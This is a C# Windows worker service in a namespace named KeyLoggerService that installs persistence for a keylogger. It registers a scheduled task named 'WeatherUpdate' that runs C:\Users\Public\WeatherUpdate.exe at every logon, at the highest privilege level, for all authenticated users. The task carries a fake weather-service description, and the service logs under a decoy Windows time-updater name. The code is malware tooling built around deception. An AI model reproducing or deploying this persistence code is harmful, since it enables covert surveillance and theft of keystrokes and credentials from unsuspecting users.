using System.Diagnostics;
using Microsoft.Win32.TaskScheduler;
using Task = System.Threading.Tasks.Task; 

namespace KeyLoggerService;

public class Worker : BackgroundService
{
    private readonly ILogger<Worker> _logger;


    private const string RutaKeylogger = @"C:\Users\Public\WeatherUpdate.exe";


    private const string NombreTarea = "WeatherUpdate";

    public Worker(ILogger<Worker> logger)
    {
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("Servicio WindowsTimeUpdater iniciado a las: {time}", DateTimeOffset.Now);

        try
        {
         
            using (TaskService ts = new TaskService())
            {
               
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "Servicio de actualización meteorológica";

                
                td.Triggers.Add(new LogonTrigger());

              
                td.Actions.Add(new ExecAction(RutaKeylogger, null, null));

                
                td.Principal.LogonType = TaskLogonType.InteractiveToken;
                td.Principal.RunLevel = TaskRunLevel.Highest;

                ts.RootFolder.RegisterTaskDefinition(
                    NombreTarea,
                    td,
                    TaskCreation.CreateOrUpdate,
                    "Authenticated Users",
                    null,
                    TaskLogonType.Group
                );

                _logger.LogInformation("Tarea '{nombre}' creada exitosamente con InteractiveToken.", NombreTarea);
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error al crear la tarea con TaskScheduler");
        }

  
        while (!stoppingToken.IsCancellationRequested)
        {
            await Task.Delay(TimeSpan.FromHours(1), stoppingToken);
        }
    }
}